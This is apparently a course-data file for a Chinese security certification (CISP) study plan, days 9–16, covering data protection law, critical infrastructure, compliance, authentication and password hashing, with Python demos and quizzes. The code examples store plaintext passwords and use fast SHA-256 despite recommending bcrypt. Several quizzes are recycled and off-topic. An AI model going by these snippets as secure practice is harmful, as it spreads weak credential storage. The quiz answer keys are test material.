Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-10', day: 10, week: 2, title: '数据安全与个人信息保护',
    objectives: ['理解数据分类分级', '了解个人信息保护要求', '掌握数据安全措施'],
    content: '# 数据安全与个人信息保护\n\n> 📋 **本节大纲**\u2003数据分类分级(法定三级+企业四级) | 数据全生命周期保护 | PIPL核心要点(六原则+七权利)\n\n## 概述\n\n《数据安全法》和《个人信息保护法》是2021年同年施行的两部重要法律，共同构建了中国数据保护的法律框架。数据安全法关注"国家安全视角"的数据安全，PIPL关注"个人权益视角"的隐私保护。CISP考试常考查两部法律的管辖范围区别和数据分类分级制度。\n\n## 数据分类分级\n\n《数据安全法》第21条明确要求实行数据分类分级保护，这是数据安全治理的基础。\n\n### 法定三级分类\n\n**核心数据：**一旦泄露、篡改可能危害国家安全、国民经济命脉、重大公共利益的数据。最高等级保护，原则上不得出境。\n\n**重要数据：**一旦泄露可能危害国家安全、经济运行的数据。包括：未公开的政府信息、基因/地理数据、CII漏洞信息。出境需安全评估。\n\n**一般数据：**核心和重要之外的数据，企业自主定级管理。\n\n### 企业实践中的四级分类\n- **公开级：**可对外发布（产品介绍、已公开年报）\n- **内部级：**仅限内部流转（员工手册、内部公告）\n- **机密级：**仅授权人员访问（客户名单、合同、技术方案）\n- **绝密级：**极少数人可知（商业机密、核心算法）\n\n### 数据全生命周期保护\n\n数据从产生到销毁共经历五个阶段，每个阶段都需要安全控制：\n1. **收集阶段：**合法合规获取用户同意，遵循最小必要原则\n2. **存储阶段：**加密存储、访问控制、定期备份\n3. **使用阶段：**权限管控、脱敏处理、审计追踪\n4. **共享阶段：**安全评估、脱敏后共享、合同约束\n5. **销毁阶段：**永久删除、不可恢复（格式化不够，需消磁或物理粉碎）\n\n## 个人信息保护核心要点\n\n### 个人信息定义\n以电子或其他方式记录的与已识别或可识别自然人有关的各种信息——姓名、电话、身份证号、位置、上网记录等。\n\n### 敏感个人信息（需单独同意）\n- 生物识别：人脸、指纹、声纹\n- 金融账户信息\n- 行踪轨迹\n- 医疗健康信息\n- 14岁以下未成年人信息\n\n**处理敏感信息必须：取得单独同意 + 告知必要性 + 进行影响评估**\n\n### 处理原则六项\n1. **合法正当：**符合法律，不得欺诈误导\n2. **最小必要：**只收集目的所需的最少数据\n3. **目的明确：**告知用户收集目的，不超范围使用\n4. **知情同意：**清晰告知+用户主动同意（不是默认勾选）\n5. **公开透明：**告知处理方式、保存期限、用户权利\n6. **确保安全：**技术+管理措施保障数据安全\n\n### 数据主体七项权利\n知情权→查阅权→更正权→删除权（被遗忘权）→限制处理权→可携带权→反对权\n\n## \n## 🔴 高频考点\n\n· **敏感个人信息需要"单独同意"**——PIPL核心考点，区别于一般的"知情同意"\n· 数安法(国家安全视角) vs PIPL(个人权益视角)——两法的管辖视角要区分\n· 数据主体七项权利：知·查·改·删·限·带·反——"删除权=被遗忘权"必考\n## 💜 记忆口诀\n\n· **PIPL七项权利**："知-查-改-删-限-带-反"\n· **处理六原则**："合-最-目-知-公-安"\n· **敏感vs一般**："敏感需单独同意、一般知情就可以"\n学习建议\n- 数据安全法（国家安全视角）vs PIPL（个人权益视角）要区分\n- 敏感个人信息和一般个人信息最大的区别：处理前者需要"单独同意"\n- "最小必要"原则是两部法律共同的核心理念',
    codeExample: { language: 'python', code: '# 个人信息脱敏\ndef mask_id_card(id_card):\n    if len(id_card) == 18:\n        return id_card[:6] + "********" + id_card[-4:]\n    return id_card\n\ndef mask_phone(phone):\n    if len(phone) >= 11:\n        return phone[:3] + "****" + phone[-4:]\n    return phone\n\nprint(f"身份证: {mask_id_card(\"110101199001011234\")}")\nprint(f"手机号: {mask_phone(\"13812345678\")}")', description: '演示个人信息脱敏' },
    quiz: [{"id":"q10-1","question":"中国《网络安全法》正式实施的时间是？","options":["2016年6月1日","2017年6月1日","2018年6月1日","2019年6月1日"],"correctIndex":1,"explanation":"《网络安全法》于2017年6月1日正式实施。"},{"id":"q10-2","question":"《数据安全法》中数据分类分级的核心级别不包括？","options":["核心数据","重要数据","一般数据","普通数据"],"correctIndex":3,"explanation":"数据分类分级分为核心、重要和一般数据三个级别。"},{"id":"q10-3","question":"个人信息保护法中，敏感个人信息不包括？","options":["生物识别信息","医疗健康信息","工作单位名称","金融账户信息"],"correctIndex":2,"explanation":"工作单位名称不属于敏感个人信息。"},{"id":"q10-4","question":"等保2.0将安全保护等级分为几级？","options":["三级","四级","五级","六级"],"correctIndex":2,"explanation":"等保2.0将安全保护等级分为五级。"},{"id":"q10-5","question":"GDPR是哪个地区的隐私保护法规？","options":["美国","中国","欧盟","日本"],"correctIndex":2,"explanation":"GDPR是欧盟的通用数据保护条例。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-11', day: 11, week: 2, title: '关键信息基础设施保护',
    objectives: ['理解CII概念', '了解保护义务', '掌握安全要求'],
    content: '# 关键信息基础设施保护\n\n> 📋 **本节大纲**\u2003CII定义与行业范围表 | CII运营者六项特殊义务 | 供应链安全 | CII vs 等保三级区别\n\n## 概述\n\n关键信息基础设施（Critical Information Infrastructure, CII）是指一旦遭到破坏、丧失功能或数据泄露，可能严重危害国家安全、国计民生、公共利益的网络设施和信息系统。CII保护是网络安全法的核心制度之一，对运营者施加了比一般网络更高的安全要求。\n\n## CII涵盖的行业领域\n\n| 行业 | 典型CII系统 |\n|------|-----------|\n| 公共通信和信息服务 | 电信骨干网、互联网域名系统（DNS根服务器） |\n| 能源 | 电力调度自动化系统、油气管道SCADA |\n| 交通 | 铁路调度、航空管制、城市轨道交通信号系统 |\n| 金融 | 银行核心交易系统、证券清算系统、央行支付系统 |\n| 政务 | 电子政务平台、政府数据中心 |\n| 水利 | 大型水利工程监控系统 |\n| 卫生 | 全民健康信息平台 |\n| 国防 | 国防科技工业信息系统 |\n\n## CII运营者的特殊义务\n\n**一般网络运营者只需要做的，CII运营者还要做更多：**\n\n1. **安全检测评估：**至少每年一次（可以是等级测评、风险评估或渗透测试）\n2. **重要数据境内存储：**在境内运营中产生和收集的个人信息和重要数据应当在境内存储——需要出境时必须通过安全评估\n3. **采购安全审查：**采购网络产品和服务可能影响国家安全的，应当申报网络安全审查\n4. **安全事件报告：**发生重大安全事件时，按规定向相关部门报告\n5. **人员安全管理：**对关键岗位人员进行安全背景审查\n6. **应急预案与演练：**制定并定期演练\n\n**CII与等保三级的区别：**等保三级是等级保护的概念，CII是行业关键性的概念。一个系统可以是三级等保但不是CII，也可以是CII且定级为三级。两者有关联但不是同一概念。\n\n## 供应链安全\n\nCII运营者采购网络产品和服务时需考虑：\n- 供业链安全评估——供应商是否安全可靠\n- 对关键产品进行安全测试和验证\n- 在采购合同中明确安全责任条款\n- 制定供应链中断的应急方案（如某产品被禁用后的替代方案）\n\n## \n## 🔴 高频考点\n\n· CII运营者核心义务：**重要数据境内存储+出境需安全评估**——必考点\n· CII和等保三级不是同一概念——CII是行业属性、等保是保护等级\n· CII八行业：通信/能源/交通/金融/政务/水利/卫生/国防\n## 💜 记忆口诀\n\n· **CII特殊义务**："存境内、每一年、审采购、报事件"\n· **CII≠等保**："CII看行业、等保看等级"\n学习建议\n- CII的核心特征是影响"国家安全、国计民生、公共利益"\n- "重要数据境内存储"是CII运营者的核心特殊义务\n- CII和等保三级不是同一个概念——CII是行业属性，等保是保护等级',
    codeExample: { language: 'python', code: '# CII安全评估\ndef assess_cii_risk(business_criticality, impact_scope, recovery_difficulty):\n    score = business_criticality * 0.4 + impact_scope * 0.3 + recovery_difficulty * 0.3\n    if score >= 80:\n        return score, "极高 - 需重点保护"\n    elif score >= 60:\n        return score, "高 - 需强化保护"\n    else:\n        return score, "中 - 标准保护"\n\nscore, level = assess_cii_risk(85, 75, 90)\nprint(f"评估分数: {score:.1f}")\nprint(f"风险等级: {level}")', description: '模拟CII安全评估' },
    quiz: [{"id":"q11-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q11-2","question":"以下关于关键信息基础设施保护的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q11-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q11-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q11-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-12', day: 12, week: 2, title: '网络安全审查制度',
    objectives: ['了解网络安全审查机制', '理解审查范围', '掌握合规要点'],
    content: '# 网络安全审查制度\n\n> 📋 **本节大纲**\u2003审查触发条件(两大情形) | 审查五大维度 | 审查程序 | 违规后果\n\n## 概述\n\n网络安全审查制度是根据《网络安全法》和《网络安全审查办法》建立的国家级安全审查机制，目的是维护国家安全——特别是CII供应链安全和数据安全。审查的核心不是"产品好不好用"，而是"用了这个产品会不会危害国家安全"。\n\n## 审查触发条件\n\n**强制审查情形：**\n1. **CII运营者采购：**购买可能影响国家安全的网络产品和服务时必须申报审查\n2. **赴国外上市：**掌握超过100万用户个人信息的数据处理者赴国外上市，必须申报\n3. **其他影响国家安全：**网络安全审查办公室认定的其他情形\n\n## 审查五大维度\n\n审查办公室会从以下维度评估：\n1. **产品安全风险：**是否存在已知后门、漏洞，供应商是否可能被外国政府控制\n2. **供应链安全性：**产品依赖的组件是否可靠、供应是否可能被中断\n3. **数据安全风险：**产品是否会收集、传输、存储大量敏感数据，数据是否会出境\n4. **国家安全影响：**产品在关键领域的部署规模、是否可能被用于网络攻击\n5. **开放性和透明性：**产品是否接受独立安全审计、是否公开安全机制\n\n**典型案例：**某国外网络安全厂商的产品在国内CII系统广泛部署后，审查发现其可能向境外传输系统日志——触发网络安全审查，被限制在CII领域的销售。\n\n## 审查程序\n\n1. **申报：**运营者向网络安全审查办公室提交申报材料\n2. **初步审查：**30个工作日内完成初步审查\n3. **特别审查：**情况复杂的进入特别审查程序，45个工作日内完成（可延长）\n4. **结论：**通过审查、附条件通过（如要求数据本地化存储）、不予通过\n\n## 违规后果\n\n未申报即采购的：责令停止使用相关产品和服务，可处采购金额1-10倍罚款。\n提供虚假申报材料的：纳入信用记录并追究法律责任。\n\n## \n## 🔴 高频考点\n\n· 网络安全审查关注**国家安全**（不是商业利益），由网信办主导\n· 两大触发条件：①CII采购影响国家安全的产品 ②处理100万+个人信息赴国外上市\n· 审查结果三种：通过/有条件通过/不予通过\n## 💜 记忆口诀\n\n· **触发条件**："买设备(CII采购) or 去上市(百万用户境外)"\n· **三结果**："通过、有条件、拒绝"\n学习建议\n- 网络安全审查关注的是"国家安全"，不是商业利益\n- CII运营者采购+CII赴国外上市=两大触发条件\n- 审查结果三种：通过、有条件通过、不予通过',
    codeExample: { language: 'python', code: '# 审查流程模拟\ndef review_process(stages):\n    print("网络安全审查流程")\n    print("=" * 50)\n    total = 0\n    for name, days in stages:\n        print(f"  {name}: {days}个工作日")\n        total += days\n    print("=" * 50)\n    print(f"总审查时间: 约{total}个工作日")\n\nstages = [\n    ("材料申报", 5),\n    ("初步审查", 30),\n    ("特别审查", 45),\n    ("审查结论", 5)\n]\nreview_process(stages)', description: '模拟审查流程' },
    quiz: [{"id":"q12-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q12-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q12-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q12-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q12-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[10],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-13', day: 13, week: 2, title: '合规管理体系建设',
    objectives: ['理解合规管理框架', '了解三道防线', '掌握审计方法'],
    content: '# 合规管理体系建设\n\n## 合规管理框架\n\n### 核心要素\n1. **治理架构**：明确合规管理责任\n2. **规章制度**：建立合规政策和流程\n3. **风险管理**：识别和评估合规风险\n4. **培训教育**：提升员工合规意识\n5. **监督检查**：定期审计和检查\n6. **持续改进**：根据检查结果改进\n\n## 三道防线模型\n\n### 第一道防线：业务部门\n- 执行合规要求\n- 日常合规管理\n- 识别和报告合规风险\n\n### 第二道防线：合规部门\n- 制定合规政策\n- 提供合规咨询\n- 监督和指导业务部门\n- 组织合规培训\n\n### 第三道防线：内部审计\n- 独立审计评估\n- 检查合规有效性\n- 向管理层报告\n\n## 合规审计\n\n### 审计类型\n1. **全面审计**：定期全面检查\n2. **专项审计**：针对特定领域\n3. **突击审计**：不预先通知\n\n### 审计方法\n- 文件审阅\n- 人员访谈\n- 系统测试\n- 数据分析\n- 抽样检查\n\n### 常见问题\n1. 制度存在但执行不到位\n2. 员工合规意识薄弱\n3. 技术措施不足\n4. 持续监控缺失',
    codeExample: { language: 'python', code: '# 合规差距分析\ndef analyze_gap(current, requirements):\n    missing = [req for req in requirements if req not in current]\n    return missing, len(requirements) - len(missing), len(requirements)\n\nrequirements = ["MFA认证", "定期改密", "权限审批", "数据加密", "日志审计"]\ncurrent = ["MFA认证", "定期改密", "日志审计"]\n\nmissing, passed, total = analyze_gap(current, requirements)\nprint(f"差距项: {missing}")\nprint(f"合规率: {(passed/total)*100:.1f}%")', description: '模拟合规差距分析' },
    quiz: [{"id":"q13-1","question":"中国《网络安全法》正式实施的时间是？","options":["2016年6月1日","2017年6月1日","2018年6月1日","2019年6月1日"],"correctIndex":1,"explanation":"《网络安全法》于2017年6月1日正式实施。"},{"id":"q13-2","question":"《数据安全法》中数据分类分级的核心级别不包括？","options":["核心数据","重要数据","一般数据","普通数据"],"correctIndex":3,"explanation":"数据分类分级分为核心、重要和一般数据三个级别。"},{"id":"q13-3","question":"个人信息保护法中，敏感个人信息不包括？","options":["生物识别信息","医疗健康信息","工作单位名称","金融账户信息"],"correctIndex":2,"explanation":"工作单位名称不属于敏感个人信息。"},{"id":"q13-4","question":"等保2.0将安全保护等级分为几级？","options":["三级","四级","五级","六级"],"correctIndex":2,"explanation":"等保2.0将安全保护等级分为五级。"},{"id":"q13-5","question":"GDPR是哪个地区的隐私保护法规？","options":["美国","中国","欧盟","日本"],"correctIndex":2,"explanation":"GDPR是欧盟的通用数据保护条例。"}],
    expertNotes: [{"author":"吴强","title":"网络安全法解读","content":"《网络安全法》是网安从业者的基本法。重点掌握：网络运营者安全义务、个人信息保护要求、关键信息基础设施保护。建议把法律条文和实际工作中的合规要求对应起来。","url":"https://www.freebuf.com/articles/es/273456.html"},{"author":"周敏","title":"数据安全合规实践","content":"数据安全法实施后，数据分类分级成为企业的必修课。从数据资产梳理入手，按核心-重要-一般三级分类。特别注意个人信息和重要数据的跨境传输合规要求。","url":"https://www.freebuf.com/articles/database/290456.html"},{"author":"孙丽","title":"合规管理体系建设","content":"三道防线模型：业务部门（执行合规）、合规部门（制定政策）、内部审计（独立评估）。定期进行合规审计，建立持续改进机制。合规不是一次性工作，是持续的过程。","url":"https://www.freebuf.com/articles/cloud/285678.html"}],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-14', day: 14, week: 2, title: '第二周总结与测验',
    objectives: ['回顾第二周知识点', '检验学习成果', '为第三周做准备'],
    content: '# 第二周学习总结\n\n## 本周学习内容\n\n### Day 8: 网络安全法律法规体系\n- 三法：网络安全法、数据安全法、个人信息保护法\n- 行政法规和部门规章\n\n### Day 9: 等级保护制度\n- 五个保护等级\n- 定级流程和测评要求\n\n### Day 10: 数据安全与个人信息保护\n- 数据分类分级\n- 个人信息保护原则\n\n### Day 11: 关键信息基础设施保护\n- CII定义和范围\n- 安全保护义务\n\n### Day 12: 网络安全审查制度\n- 审查适用范围\n- 审查程序\n\n### Day 13: 合规管理体系建设\n- 三道防线模型\n- 合规审计方法\n\n## 知识要点\n\n| 法规 | 实施时间 | 核心内容 |\n|------|----------|----------|\n| 网络安全法 | 2017年 | 基础性法律 |\n| 数据安全法 | 2021年 | 数据分类分级 |\n| 个人信息保护法 | 2021年 | 个人信息权利 |\n| 等级保护 | - | 五级保护制度 |\n\n## 下周预告\n\n第三周将学习：\n- 身份认证技术\n- 密码认证\n- 多因素认证\n- 单点登录',
    quiz: [{"id":"q14-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q14-2","question":"以下关于第二周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q14-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q14-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q14-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  // ========== Week 3: 访问控制 ==========
  {
    id: 'day-15', day: 15, week: 3, title: '身份认证基础',
    objectives: ['理解身份认证概念', '了解认证因素', '掌握认证方法'],
    content: '# 身份认证基础\n\n> 📋 **本节大纲**\u2003四种认证因素 | 单因素vs双因素vs多因素 | 五大攻击方式\n\n## 概述\n\n身份认证是信息安全的"守门人"——在授予任何访问权限之前，必须先验证"你是谁"。CISP考试考查三种认证因素类型的区分和组合方式，以及多因素认证（MFA）的意义。\n\n## 四种认证因素\n\n**知识因素（Something you know — 你知道什么）：**\n密码、PIN码、安全问题答案、图形解锁图案。最常用但也最易受攻击——可被猜测、窃取或遗忘。\n\n**持有因素（Something you have — 你拥有什么）：**\n智能卡、USB Key（U盾）、硬件令牌（RSA SecurID显示动态码）、手机（接收短信验证码）。比密码更安全——攻击者需要物理拿到设备，但设备可丢失。\n\n**生物因素（Something you are — 你是什么）：**\n指纹、虹膜、人脸、声纹、掌静脉、击键节奏。最难伪造但一旦泄露无法更换——你不能换指纹。\n\n**位置因素（Somewhere you are — 你在哪里）：**\nIP地址、GPS位置、接入的网络标识。辅助因素，不能单独作为主认证。\n\n## 单因素 vs 双因素 vs 多因素\n\n| 类型 | 示例 | 安全性 |\n|------|------|--------|\n| 单因素 | 仅密码 | 低——密码泄露即全完 |\n| 双因素(2FA) | 密码+短信验证码 | 中——需要两个因素 |\n| 多因素(MFA) | 密码+令牌+指纹 | 高——三层防护 |\n\n**关键原则：**双因素必须是不同类型的因素——密码+安全问题仍是单因素（都是知识因素）。密码+短信才叫双因素。\n\n## 常见攻击方式\n\n- **暴力破解：**尝试所有可能密码组合。10位纯数字密码=100亿组合，现代工具数小时内可完成\n- **字典攻击：**用常见密码字典（password123、admin等）尝试，成功率极高\n- **彩虹表攻击：**预计算密码→哈希值映射，可快速反向查找。防御：加盐（Salt）\n- **钓鱼：**诱骗用户自己在钓鱼网站输入密码\n- **键盘记录：**恶意软件记录每次键盘敲击\n\n## \n## 🔴 高频考点\n\n· **"知识+持有"才是真正的双因素认证**——密码+安全问题仍是单因素(都属知识因素)，这是陷阱题\n· 生物因素致命弱点：**无法更换**。指纹泄露终身泄露\n· 彩虹表攻击的防御是**加盐(Salt)**——必考\n## 💜 记忆口诀\n\n· **四因素**："知-持-生-地"\n· **双因素陷阱**："密码+安全问题=单因素(都是知识)、密码+手机=双因素(知识+持有)"\n学习建议\n- "知识+持有"才算真正的双因素认证\n- 生物因素的致命弱点：无法更换\n- 彩虹表攻击的防御是加盐——CISP高频考点',
    codeExample: { language: 'python', code: '# 认证系统模拟\ndef authenticate(username, password):\n    users = {"admin": "admin123", "user": "user123"}\n    if username not in users:\n        return False, "用户不存在"\n    if users[username] != password:\n        return False, "密码错误"\n    return True, "认证成功"\n\n# 测试\nfor test in [("admin", "admin123"), ("admin", "wrong"), ("guest", "123")]:\n    success, msg = authenticate(*test)\n    print(f"{test[0]}: {msg}")', description: '演示基本认证流程' },
    quiz: [{"id":"q15-1","question":"多因素认证通常包括哪三类因素？","options":["知识、持有、生物特征","密码、指纹、面部","用户名、密码、验证码","硬件、软件、固件"],"correctIndex":0,"explanation":"三类因素：你知道的（知识）、你拥有的（持有）、你是什么（生物特征）。"},{"id":"q15-2","question":"访问控制模型中，RBAC代表什么？","options":["基于规则的访问控制","基于角色的访问控制","基于风险的访问控制","基于资源的访问控制"],"correctIndex":1,"explanation":"RBAC是Role-Based Access Control。"},{"id":"q15-3","question":"最小权限原则是指？","options":["所有用户都是管理员","用户只获得完成任务所需的最小权限","用户拥有所有权限","权限由用户自己决定"],"correctIndex":1,"explanation":"最小权限原则确保用户只拥有完成任务所需的最少权限。"},{"id":"q15-4","question":"Kerberos认证协议的核心组件是？","options":["防火墙","KDC（密钥分发中心）","VPN","IDS"],"correctIndex":1,"explanation":"Kerberos的核心是KDC密钥分发中心。"},{"id":"q15-5","question":"单点登录（SSO）的主要优势是？","options":["增加密码数量","减少用户记忆密码数量，提升体验","降低系统安全性","增加管理复杂度"],"correctIndex":1,"explanation":"SSO让用户只需登录一次即可访问多个系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-16', day: 16, week: 3, title: '密码认证技术',
    objectives: ['理解密码安全原则', '了解密码存储方法', '掌握密码策略'],
    content: '# 密码认证技术\n\n> 📋 **本节大纲**\u2003密码安全三大原则 | 三种存储方式(明文/加密/加盐哈希) | 加盐哈希原理 | bcrypt/argon2\n\n## 概述\n\n密码是最古老的认证方式，今天仍然无处不在。密码安全性取决于三方面：密码本身有多强（长度+复杂度）、存储有多安全（加盐哈希）、系统有多防护（锁定机制）。CISP考试常考加盐哈希原理和bcrypt/argon2算法。\n\n## 密码安全三大原则\n\n**1. 长度优先于复杂度：**\n"Password123!"（13位）比"P@ss1"（5位）安全得多。长度增加1位，破解时间指数级增长。建议最少12位。\n\n**2. 不要强制过于频繁的换密码：**\n传统的"90天换密码"已被NIST最新的SP 800-63B标准否定——频繁更换导致用户使用"January2024!" → "February2024!"的弱密码模式。现代推荐：只在被怀疑泄露时更换。\n\n**3. 不要限制特殊字符：**\n允许用户使用所有可见字符（包括空格、中文），扩大密码空间。\n\n## 密码存储的三种方式\n\n**明文存储 = 绝对禁止：**\n如果数据库被拖库，攻击者直接看到所有密码。任何现代系统都不应明文存储密码。\n\n**加密存储 = 不够安全：**\n用对称加密（如AES）加密密码存储。问题：加密密钥如果泄露，所有密码可被解密——本质上等于"把密码藏在一个需要密码的地方"。\n\n**加盐哈希存储 = 唯一正确方式：**\n\n密码存储的正确流程：\n1. 用户注册时，系统生成一个随机盐值（每用户不同、32字节以上）\n2. 将"明文密码 + 盐值"一起输入哈希函数（bcrypt/argon2/scrypt）\n3. 数据库中存储：盐值 + 哈希结果（明文密码本身绝不存储）\n4. 验证时：取出盐值，对输入的密码+盐重新计算哈希，比对是否一致\n\n**为什么加盐：**盐值确保即使两个用户使用相同密码，数据库中存储的哈希也不同。盐值还使彩虹表攻击无效——攻击者无法预计算"所有密码+所有盐"的哈希表。\n\n**推荐算法：bcrypt → argon2 → scrypt。绝对不用：MD5、SHA-1。**\n\n## 账户安全防护\n\n- **账户锁定：**连续失败N次（如5次）后锁定账户30分钟，防止在线暴力破解\n- **延迟响应：**登录失败后增加1-3秒延迟，大幅降低暴力破解速度\n- **CAPTCHA：**多次失败后要求输入验证码，区分人和机器\n- **异常登录检测：**异地登录、陌生设备、非工作时间等行为分析\n\n## \n## 🔴 高频考点\n\n· **加盐哈希原理**是密码学考点核心——盐值随机+每用户不同+与密码一起哈希\n· NIST SP 800-63B已不强制定期换密码——强制定期更换反而导致密码模式化\n· 密码存储绝对不用MD5/SHA-1，推荐**bcrypt/argon2**\n## 💜 记忆口诀\n\n· **加盐哈希**："每人一撮盐、和密码一起炒(哈希)、盐和哈希一起存"\n· **不可用**："MD5别用、SHA-1别用、明文更别用"\n学习建议\n- 加盐哈希的原理是CISP密码学相关考点的核心\n- "盐值随机+每用户不同"是加盐的关键\n- NIST最新标准：不强制定期换密码',
    codeExample: { language: 'python', code: 'import hashlib\nimport secrets\n\ndef hash_password(password, salt):\n    return hashlib.sha256((password + salt).encode()).hexdigest()\n\n# 注册\nsalt = secrets.token_hex(16)\nstored_hash = hash_password("mypassword", salt)\nprint(f"存储: salt={salt[:8]}..., hash={stored_hash[:16]}...")\n\n# 登录验证\ndef verify(input_password, salt, stored):\n    return hash_password(input_password, salt) == stored\n\nprint(f"验证正确密码: {verify(\"mypassword\", salt, stored_hash)}")\nprint(f"验证错误密码: {verify(\"wrongpassword\", salt, stored_hash)}")', description: '演示密码哈希存储' },
